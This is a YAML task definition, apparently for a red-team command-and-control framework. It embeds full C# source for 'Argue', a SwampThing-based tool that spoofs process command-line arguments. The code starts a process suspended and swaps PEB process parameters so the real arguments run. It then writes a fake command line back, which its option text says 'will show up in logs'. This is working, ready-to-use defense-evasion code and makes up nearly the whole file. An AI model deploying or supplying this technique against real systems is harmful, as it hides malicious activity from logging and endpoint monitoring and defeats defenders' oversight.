- Name: Argue
  Aliases: []
  Author:
    Name: FuzzySec
    Handle: ''
    Link: ''
  Description: A task to spoof command-line arguments
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: "using System;\nusing System.Text.RegularExpressions;\nusing System.Runtime.InteropServices;\nusing System.IO;\n//using CommandLine;\n\n    public static class Task\n    {\n        // Flags\n        [Flags]\n        public enum CreateProcessFlags : uint\n        {\n            NONE = 0x00000000,\n            DEBUG_PROCESS = 0x00000001,\n            DEBUG_ONLY_THIS_PROCESS = 0x00000002,\n            CREATE_SUSPENDED = 0x00000004,\n            DETACHED_PROCESS = 0x00000008,\n            CREATE_NEW_CONSOLE = 0x00000010,\n            NORMAL_PRIORITY_CLASS = 0x00000020,\n            IDLE_PRIORITY_CLASS = 0x00000040,\n            HIGH_PRIORITY_CLASS = 0x00000080,\n            REALTIME_PRIORITY_CLASS = 0x00000100,\n            CREATE_NEW_PROCESS_GROUP = 0x00000200,\n            CREATE_UNICODE_ENVIRONMENT = 0x00000400,\n            CREATE_SEPARATE_WOW_VDM = 0x00000800,\n            CREATE_SHARED_WOW_VDM = 0x00001000,\n            CREATE_FORCEDOS = 0x00002000,\n            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,\n            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,\n            INHERIT_PARENT_AFFINITY = 0x00010000,\n            INHERIT_CALLER_PRIORITY = 0x00020000,\n            CREATE_PROTECTED_PROCESS = 0x00040000,\n            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,\n            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,\n            PROCESS_MODE_BACKGROUND_END = 0x00200000,\n            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,\n            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,\n            CREATE_DEFAULT_ERROR_MODE = 0x04000000,\n            CREATE_NO_WINDOW = 0x08000000,\n            PROFILE_USER = 0x10000000,\n            PROFILE_KERNEL = 0x20000000,\n            PROFILE_SERVER = 0x40000000,\n            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,\n        }\n\n        [Flags]\n        public enum AllocationProtect : uint\n        {\n            NONE = 0x00000000,\n            PAGE_EXECUTE = 0x00000010,\n            PAGE_EXECUTE_READ = 0x00000020,\n            PAGE_EXECUTE_READWRITE = 0x00000040,\n            PAGE_EXECUTE_WRITECOPY = 0x00000080,\n            PAGE_NOACCESS = 0x00000001,\n            PAGE_READONLY = 0x00000002,\n            PAGE_READWRITE = 0x00000004,\n            PAGE_WRITECOPY = 0x00000008,\n            PAGE_GUARD = 0x00000100,\n            PAGE_NOCACHE = 0x00000200,\n            PAGE_WRITECOMBINE = 0x00000400\n        }\n\n        // Structs\n        [StructLayout(LayoutKind.Sequential)]\n        public class RUNTIME_CHECK\n        {\n            public bool SwampIs32;\n            public bool OSIs32;\n            public bool PePathIsValid;\n            public Int16 PeArch;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public class StartupInfo\n        {\n            public Int32 cb = 0;\n            public IntPtr lpReserved = IntPtr.Zero;\n            public IntPtr lpDesktop = IntPtr.Zero;\n            public IntPtr lpTitle = IntPtr.Zero;\n            public Int32 dwX = 0;\n            public Int32 dwY = 0;\n            public Int32 dwXSize = 0;\n            public Int32 dwYSize = 0;\n            public Int32 dwXCountChars = 0;\n            public Int32 dwYCountChars = 0;\n            public Int32 dwFillAttribute = 0;\n            public Int32 dwFlags = 0;\n            public Int16 wShowWindow = 0;\n            public Int16 cbReserved2 = 0;\n            public IntPtr lpReserved2 = IntPtr.Zero;\n            public IntPtr hStdInput = IntPtr.Zero;\n            public IntPtr hStdOutput = IntPtr.Zero;\n            public IntPtr hStdError = IntPtr.Zero;\n\n            public StartupInfo()\n            {\n                this.cb = Marshal.SizeOf(this);\n            }\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct ProcessInformation\n        {\n            public IntPtr hProcess;\n            public IntPtr hThread;\n            public Int32 dwProcessId;\n            public Int32 dwThreadId;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct PROCESS_BASIC_INFORMATION\n        {\n            public IntPtr ExitStatus;\n            public IntPtr PebBaseAddress;\n            public IntPtr AffinityMask;\n            public IntPtr BasePriority;\n            public UIntPtr UniqueProcessId;\n            public IntPtr InheritedFromUniqueProcessId;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public class SecurityAttributes\n        {\n            public Int32 Length = 0;\n            public IntPtr lpSecurityDescriptor = IntPtr.Zero;\n            public bool bInheritHandle = false;\n\n            public SecurityAttributes()\n            {\n                this.Length = Marshal.SizeOf(this);\n            }\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct UNICODE_STRING\n        {\n            public UInt16 Length;\n            public UInt16 MaximumLength;\n            public IntPtr Buffer;\n        }\n\n        // Kernel32\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Unicode)]\n        public static extern bool CreateProcess (\n            String lpApplicationName,\n            String lpCommandLine,\n            SecurityAttributes lpProcessAttributes,\n            SecurityAttributes lpThreadAttributes,\n            Boolean bInheritHandles,\n            CreateProcessFlags dwCreationFlags,\n            IntPtr lpEnvironment,\n            String lpCurrentDirectory,\n            [In] StartupInfo lpStartupInfo,\n            out ProcessInformation lpProcessInformation);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern Boolean WriteProcessMemory(\n            IntPtr hProcess,\n            IntPtr lpBaseAddress,\n            IntPtr lpBuffer,\n            UInt32 nSize,\n            ref UInt32 lpNumberOfBytesWritten);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern Boolean ReadProcessMemory(\n            IntPtr hProcess,\n            IntPtr lpBaseAddress,\n            IntPtr lpBuffer,\n            UInt32 dwSize,\n            ref UInt32 lpNumberOfBytesRead);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern void RtlZeroMemory(\n            IntPtr pBuffer,\n            int length);\n\n        [DllImport(\"kernel32.dll\")]\n            public static extern Boolean VirtualProtectEx(\n            IntPtr hProcess,\n            IntPtr lpAddress,\n            UInt32 dwSize,\n            AllocationProtect flNewProtect,\n            ref UInt32 lpflOldProtect);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern IntPtr VirtualAllocEx(\n            IntPtr hProcess,\n            IntPtr lpAddress,\n            uint dwSize,\n            int flAllocationType,\n            int flProtect);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern UInt32 ResumeThread(\n            IntPtr hThread);\n\n        // NtDll\n        [DllImport(\"ntdll.dll\")]\n        public static extern UInt32 NtQueryInformationProcess(\n            IntPtr processHandle,\n            UInt32 processInformationClass,\n            ref PROCESS_BASIC_INFORMATION processInformation,\n            int processInformationLength,\n            ref UInt32 returnLength);\n\n        [DllImport(\"ntdll.dll\")]\n        public static extern void RtlInitUnicodeString(\n            ref UNICODE_STRING DestinationString,\n            [MarshalAs(UnmanagedType.LPWStr)]\n            string SourceString);\n\n        [DllImport(\"ntdll.dll\")]\n        public static extern UInt32 RtlCreateProcessParametersEx(\n            ref IntPtr pProcessParameters,\n            IntPtr ImagePathName,\n            IntPtr DllPath,\n            IntPtr CurrentDirectory,\n            IntPtr CommandLine,\n            IntPtr Environment,\n            IntPtr WindowTitle,\n            IntPtr DesktopInfo,\n            IntPtr ShellInfo,\n            IntPtr RuntimeData,\n            uint Flags);\n\n        public static void PrintLogo()\n        {\n            Console.WriteLine(\"      /                                      \");\n            Console.WriteLine(\"     :;                \\\\                    \");\n            Console.WriteLine(\"     |l      _____     |;                    \");\n            Console.WriteLine(\"     `8o __-~     ~\\\\   d|     Swamp         \");\n            Console.WriteLine(\"      \\\"88p;.  -._\\\\_;.oP         Thing      \");\n            Console.WriteLine(\"       `>,% (\\\\  (\\\\./)8\\\"                   \");\n            Console.WriteLine(\"      ,;%%%:  ./V^^^V'                       \");\n            Console.WriteLine(\";;;,-::::::'_::\\\\   ||\\\\                     \");\n            Console.WriteLine(\"8888oooooo.  :\\\\`^^^/,,~--._                 \");\n            Console.WriteLine(\" oo.8888888888:`((( o.ooo888                 \");\n            Console.WriteLine(\"   `o`88888888b` )) 888b8888                 \");\n            Console.WriteLine(\"     b`888888888;(.,\\\"888b888\\\\              \");\n            Console.WriteLine(\"....  b`8888888:::::.`8888.                  \");\n            Console.WriteLine(\" `:::. `:::OOO:::::::.`OO' ;                 \");\n            Console.WriteLine(\"   `.      \\\"``::::::''.'        ~ b33f ~  \\n\");\n        }\n\n        // Helpers\n        public static RUNTIME_CHECK CheckAllTheThings(String Launch)\n        {\n            RUNTIME_CHECK rt = new RUNTIME_CHECK();\n            if (IntPtr.Size == 4)\n            {\n                rt.SwampIs32 = true;\n            } else\n            {\n                rt.SwampIs32 = false;\n            }\n\n            if (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable(\"ProgramFiles(x86)\")))\n            {\n                rt.OSIs32 = false;\n            } else\n            {\n                rt.OSIs32 = true;\n            }\n\n            bool bExists = File.Exists(Launch);\n            rt.PePathIsValid = bExists;\n\n            Int16 Arch = GetPeArch(Launch);\n            rt.PeArch = Arch;\n\n            return rt;\n        }\n        \n        public static PROCESS_BASIC_INFORMATION PBI(IntPtr hProc)\n        {\n            PROCESS_BASIC_INFORMATION PBI = new PROCESS_BASIC_INFORMATION();\n            int PBI_Size = Marshal.SizeOf(PBI);\n            UInt32 RetLen = 0;\n            UInt32 CallResult = NtQueryInformationProcess(hProc,0,ref PBI,PBI_Size,ref RetLen);\n            return PBI;\n        }\n\n        public static Int16 GetPeArch(String PE)\n        {\n            Int16 PeArch;\n            Byte[] PeArray;\n            IntPtr pArray = IntPtr.Zero;\n            bool bExists = File.Exists(PE);\n            if (!bExists)\n            {\n                PeArch = 0;\n            } else\n            {\n                try\n                {\n                    FileStream fs = new FileStream(PE, FileMode.Open, FileAccess.Read);\n                    PeArray = new byte[0x500];\n                    fs.Read(PeArray, 0, 0x500);\n                } catch\n                {\n                    PeArch = 0;\n                    return PeArch;\n                }\n\n                pArray = Marshal.AllocHGlobal(PeArray.Length);\n                Marshal.Copy(PeArray, 0, pArray, PeArray.Length);\n\n                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(pArray.ToInt64() + 0x3c));\n                PeArch = Marshal.ReadInt16((IntPtr)(pArray.ToInt64() + PeHeader + 0x18));\n                if (PeArch != 0x010b && PeArch != 0x020b)\n                {\n                    PeArch = 0;\n                }\n            }\n\n            // Free array\n            if (pArray != IntPtr.Zero)\n            {\n                Marshal.FreeHGlobal(pArray);\n            }\n\n            return PeArch;\n        }\n\n        public static IntPtr EmitUnicodeString(String Data)\n        {\n            UNICODE_STRING StringObject = new UNICODE_STRING();\n            StringObject.Length = (UInt16)(Data.Length * 2);\n            StringObject.MaximumLength = (UInt16)(StringObject.Length + 1);\n            StringObject.Buffer = Marshal.StringToHGlobalUni(Data);\n            IntPtr pUnicodeString = Marshal.AllocHGlobal(16);\n            Marshal.StructureToPtr(StringObject, pUnicodeString, true);\n            return pUnicodeString;\n        }\n\n        public static IntPtr ReadRemoteMem(IntPtr hProc, Int64 pMem, Int32 Size)\n        {\n            // Alloc & null buffer\n            IntPtr pMemLoc = Marshal.AllocHGlobal(Size);\n            RtlZeroMemory(pMemLoc, Size);\n\n            // Read\n            uint BytesRead = 0;\n            bool bRPM = ReadProcessMemory(hProc, (IntPtr)(pMem), pMemLoc, (uint)Size, ref BytesRead);\n            if (!bRPM || BytesRead != Size)\n            {\n                if (pMemLoc != IntPtr.Zero)\n                {\n                    Marshal.FreeHGlobal(pMemLoc);\n                }\n                return IntPtr.Zero;\n            } else\n            {\n                return pMemLoc;\n            }\n        }\n\n        public static IntPtr AllocRemoteMem(IntPtr hProc, Int32 Size, IntPtr Address = new IntPtr())\n        {\n            IntPtr pRemoteMem = VirtualAllocEx(hProc, Address, (UInt32)Size, 0x3000, (Int32)AllocationProtect.PAGE_READWRITE);\n            return pRemoteMem;\n        }\n\n        public static Boolean WriteRemoteMem(IntPtr hProc, IntPtr pSource, IntPtr pDest, Int32 Size, AllocationProtect Protect)\n        {\n            UInt32 BytesWritten = 0;\n            Boolean bRemoteWrite = WriteProcessMemory(hProc, pDest, pSource, (uint)Size, ref BytesWritten);\n            if(!bRemoteWrite)\n            {\n                return false;\n            }\n\n            UInt32 OldProtect = 0;\n            Boolean bProtect = VirtualProtectEx(hProc, pDest, (uint)Size, Protect, ref OldProtect);\n            if (!bProtect)\n            {\n                return false;\n            }\n\n            return true;\n        }\n\n        // Main logic\n        public static string Execute(String Launch, String RealCmdLine, String FakeCmdLine)\n        {\n            // Invoke all the checks\n            RUNTIME_CHECK RunTime = CheckAllTheThings(Launch);\n            if (RunTime.PePathIsValid == false)\n            {\n                Console.WriteLine(\"[!] Invalid PE path specified..\");\n                return \"Not Done\";\n            }\n            if (RunTime.PeArch == 0)\n            {\n                Console.WriteLine(\"[!] Invalid PE image..\");\n                return \"Not Done\";\n            }\n            if (RunTime.SwampIs32 && RunTime.PeArch == 0x020b || !RunTime.SwampIs32 && RunTime.PeArch == 0x010b)\n            {\n                Console.WriteLine(\"[!] SwampThing and target PE architectures do not match..\");\n                return \"Not Done\";\n            }\n\n            // Create the target process\n            SecurityAttributes SecAttrib = new SecurityAttributes();\n            String CurrentDir = Directory.GetCurrentDirectory();\n            StartupInfo si = new StartupInfo();\n            ProcessInformation pi;\n            bool bProc = CreateProcess(Launch, FakeCmdLine, SecAttrib, SecAttrib, false, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, CurrentDir, si, out pi);\n            if (!bProc)\n            {\n                Console.WriteLine(\"[!] Process execution failed..\");\n                return \"Not Done\";\n            } else\n            {\n                Console.WriteLine(\"[>] CreateProcess -> Suspended\");\n            }\n\n            // Get PBI\n            PROCESS_BASIC_INFORMATION CallResult = PBI(pi.hProcess);\n            if (CallResult.PebBaseAddress == IntPtr.Zero)\n            {\n                Console.WriteLine(\"[!] Failed to aquire PBI\");\n                return \"Not Done\";\n            } else\n            {\n                if (RunTime.PeArch == 0x010b)\n                {\n                    Console.WriteLine(\"[+] PE Arch                       : 32-bit\");\n                } else\n                {\n                    Console.WriteLine(\"[+] PE Arch                       : 64-bit\");\n                }\n                Console.WriteLine(\"[+] Process Id                    : \" + CallResult.UniqueProcessId);\n                Console.WriteLine(\"[+] PEB Base                      : 0x\" + string.Format(\"{0:X}\", (CallResult.PebBaseAddress).ToInt64()));\n            }\n\n            // Get PEB->(IntPtr)_RTL_USER_PROCESS_PARAMETERS->(UNICODE_STRING)CommandLine\n            Int32 RTL_USER_PROCESS_PARAMETERS;\n            Int32 CommandLine;\n            Int32 ReadSize;\n            if (RunTime.PeArch == 0x010b)\n            {\n                RTL_USER_PROCESS_PARAMETERS = 0x10;\n                CommandLine = 0x40;\n                ReadSize = 0x4;\n            } else\n            {\n                RTL_USER_PROCESS_PARAMETERS = 0x20;\n                CommandLine = 0x70;\n                ReadSize = 0x8;\n            }\n\n            // We can't acquire a remote PEB lock so we sleep briefly\n            System.Threading.Thread.Sleep(500); // 500ms\n\n            // Read remote PEB offsets\n            UInt64 ProcParams;\n            IntPtr pProcParams = ReadRemoteMem(pi.hProcess, ((CallResult.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS), ReadSize);\n            if (ReadSize == 0x4)\n            {\n                ProcParams = (UInt64)Marshal.ReadInt32(pProcParams);\n            } else\n            {\n                ProcParams = (UInt64)Marshal.ReadInt64(pProcParams);\n            }\n            Console.WriteLine(\"[+] RTL_USER_PROCESS_PARAMETERS   : 0x\" + string.Format(\"{0:X}\", ProcParams));\n            UInt64 CmdLineUnicodeStruct = ProcParams + (UInt64)CommandLine;\n            Console.WriteLine(\"[+] CommandLine                   : 0x\" + string.Format(\"{0:X}\", CmdLineUnicodeStruct));\n\n            // Get current CommandLine -> UNICODE_STRING\n            UNICODE_STRING CurrentCmdLineStruct = new UNICODE_STRING();\n            Int32 UniStructSize = Marshal.SizeOf(CurrentCmdLineStruct);\n            IntPtr pCmdLineStruct = ReadRemoteMem(pi.hProcess, (Int64)CmdLineUnicodeStruct, UniStructSize);\n            CurrentCmdLineStruct = (UNICODE_STRING)Marshal.PtrToStructure(pCmdLineStruct, typeof(UNICODE_STRING));\n            Console.WriteLine(\"[+] UNICODE_STRING |-> Len        : \" + CurrentCmdLineStruct.Length);\n            Console.WriteLine(\"                   |-> MaxLen     : \" + CurrentCmdLineStruct.MaximumLength);\n            Console.WriteLine(\"                   |-> pBuff      : 0x\" + string.Format(\"{0:X}\", (UInt64)CurrentCmdLineStruct.Buffer));\n\n            // Create replacement CommandLine\n            Console.WriteLine(\"\\n[>] Rewrite -> RTL_USER_PROCESS_PARAMETERS\");\n\n            // RTL_USER_PROCESS_PARAMETERS unicode string params\n            String WinDir = Environment.GetEnvironmentVariable(\"windir\");\n            IntPtr uSystemDir = EmitUnicodeString((WinDir + \"\\\\System32\"));\n            IntPtr uLaunchPath = EmitUnicodeString(Launch);\n            IntPtr uWindowName = EmitUnicodeString(\"SwampThing\");\n            IntPtr uRealCmdLine = EmitUnicodeString(\" \" + RealCmdLine);\n\n            // Create local RTL_USER_PROCESS_PARAMETERS\n            IntPtr pProcessParams = IntPtr.Zero;\n            uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uLaunchPath, uSystemDir, uSystemDir, uRealCmdLine, IntPtr.Zero, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);\n            if (RtlCreateSuccess != 0)\n            {\n                Console.WriteLine(\"[!] Failed to create process parameters\");\n                return \"Not Done\";\n            } else\n            {\n                Console.WriteLine(\"[+] RtlCreateProcessParametersEx  : 0x\" + string.Format(\"{0:X}\", (UInt64)pProcessParams));\n            }\n\n            // Remote map RTL_USER_PROCESS_PARAMETERS\n            Int32 iProcessParamsSize = Marshal.ReadInt32((IntPtr)((Int64)pProcessParams + 4));\n            IntPtr pRemoteProcessParams = AllocRemoteMem(pi.hProcess, iProcessParamsSize, pProcessParams);\n            Boolean bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pProcessParams, pProcessParams, iProcessParamsSize, AllocationProtect.PAGE_READWRITE);\n            if (bRemoteWriteSuccess)\n            {\n                Console.WriteLine(\"[+] RemoteAlloc                   : 0x\" + string.Format(\"{0:X}\", (UInt64)pRemoteProcessParams));\n                Console.WriteLine(\"[+] Size                          : \" + iProcessParamsSize);\n            } else\n            {\n                Console.WriteLine(\"[!] Failed to allocate custom RTL_USER_PROCESS_PARAMETERS\");\n                return \"Not Done\";\n            }\n\n            // Rewrite the process parameters pointer\n            IntPtr pRewriteProcessParams = Marshal.AllocHGlobal(ReadSize);\n            if (ReadSize == 0x4)\n            {\n                Marshal.WriteInt32(pRewriteProcessParams, (Int32)pProcessParams);\n            } else\n            {\n                Marshal.WriteInt64(pRewriteProcessParams, (Int64)pProcessParams);\n            }\n            bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pRewriteProcessParams, (IntPtr)((CallResult.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS), ReadSize, AllocationProtect.PAGE_READWRITE);\n            if (bRemoteWriteSuccess)\n            {\n                Console.WriteLine(\"[?] Success, sleeping 500ms..\");\n            }\n            else\n            {\n                Console.WriteLine(\"[!] Failed to rewrite PEB->pProcessParameters\");\n                return \"Not Done\";\n            }\n\n            // Resume process\n            UInt32 ResumeProc = ResumeThread(pi.hThread);\n            System.Threading.Thread.Sleep(500);\n\n            // Finally we rewrite the commandline to the fake value\n            Console.WriteLine(\"\\n[>] Reverting RTL_USER_PROCESS_PARAMETERS\");\n            IntPtr uFakeCmdLine = EmitUnicodeString(\" \" + FakeCmdLine);\n            Console.WriteLine(\"[+] Local UNICODE_STRING          : 0x\" + string.Format(\"{0:X}\", (UInt64)uFakeCmdLine));\n\n            // Copy unicode buffer to remote process\n            IntPtr pRemoteCmdLine = AllocRemoteMem(pi.hProcess, (Marshal.ReadInt16((IntPtr)((UInt64)uFakeCmdLine + 2)))); // MaxLength\n            if (ReadSize == 0x4)\n            {\n                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, (IntPtr)(Marshal.ReadInt32((IntPtr)((UInt64)uFakeCmdLine + 4))), pRemoteCmdLine, (Marshal.ReadInt16(uFakeCmdLine)), AllocationProtect.PAGE_READWRITE);\n            } else\n            {\n                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, (IntPtr)(Marshal.ReadInt64((IntPtr)((UInt64)uFakeCmdLine + 8))), pRemoteCmdLine, (Marshal.ReadInt16(uFakeCmdLine)), AllocationProtect.PAGE_READWRITE);\n            }\n            Console.WriteLine(\"[+] Remote UNICODE_STRING.Buffer  : 0x\" + string.Format(\"{0:X}\", (UInt64)pRemoteCmdLine));\n\n            // Recalculate new RTL_USER_PROCESS_PARAMETERS\n            pProcParams = ReadRemoteMem(pi.hProcess, ((CallResult.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS), ReadSize);\n            if (ReadSize == 0x4)\n            {\n                ProcParams = (UInt64)Marshal.ReadInt32(pProcParams);\n            }\n            else\n            {\n                ProcParams = (UInt64)Marshal.ReadInt64(pProcParams);\n            }\n            Console.WriteLine(\"[+] pRTL_USER_PROCESS_PARAMETERS  : 0x\" + string.Format(\"{0:X}\", ProcParams));\n\n            // Rewrite RTL_USER_PROCESS_PARAMETERS->CommandLine => Length, MaxLength, Buffer\n            bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, uFakeCmdLine, (IntPtr)(ProcParams + (UInt32)CommandLine), 2, AllocationProtect.PAGE_READWRITE);\n            bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, (IntPtr)((UInt64)uFakeCmdLine + 2), (IntPtr)(ProcParams + (UInt32)CommandLine + 2), 2, AllocationProtect.PAGE_READWRITE);\n            IntPtr pRemoteBuff = Marshal.AllocHGlobal(8);\n            if (ReadSize == 0x4)\n            {\n                Marshal.WriteInt32(pRemoteBuff, (Int32)pRemoteCmdLine);\n                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pRemoteBuff, (IntPtr)(ProcParams + (UInt32)CommandLine + 4), 4, AllocationProtect.PAGE_READWRITE);\n            }\n            else\n            {\n                Marshal.WriteInt64(pRemoteBuff, (Int64)pRemoteCmdLine);\n                bRemoteWriteSuccess = WriteRemoteMem(pi.hProcess, pRemoteBuff, (IntPtr)(ProcParams + (UInt32)CommandLine + 8), 8, AllocationProtect.PAGE_READWRITE);\n            }\n            Console.WriteLine(\"[?] Success rewrote Len, MaxLen, Buffer..\");\n            return \"Well Done\";\n        }\n        \n    }\n\n"
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Launch
    Value: ''
    DefaultValue: ''
    Description: The absolute path of the target executable
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: RealCmdLine
    Value: ''
    DefaultValue: ''
    Description: The real arguments to execute
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: FakeCmdLine
    Value: ''
    DefaultValue: ''
    Description: The fake arguments that will show up in logs
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries: []
  ReferenceAssemblies:
  - Name: System.Core.dll
    Location: net40/System.Core.dll
    DotNetVersion: Net40
  - Name: System.dll
    Location: net40/System.dll
    DotNetVersion: Net40
  - Name: mscorlib.dll
    Location: net40/mscorlib.dll
    DotNetVersion: Net40
  - Name: mscorlib.dll
    Location: net35/mscorlib.dll
    DotNetVersion: Net35
  - Name: System.Core.dll
    Location: net35/System.Core.dll
    DotNetVersion: Net35
  - Name: System.dll
    Location: net35/System.dll
    DotNetVersion: Net35
  EmbeddedResources: []
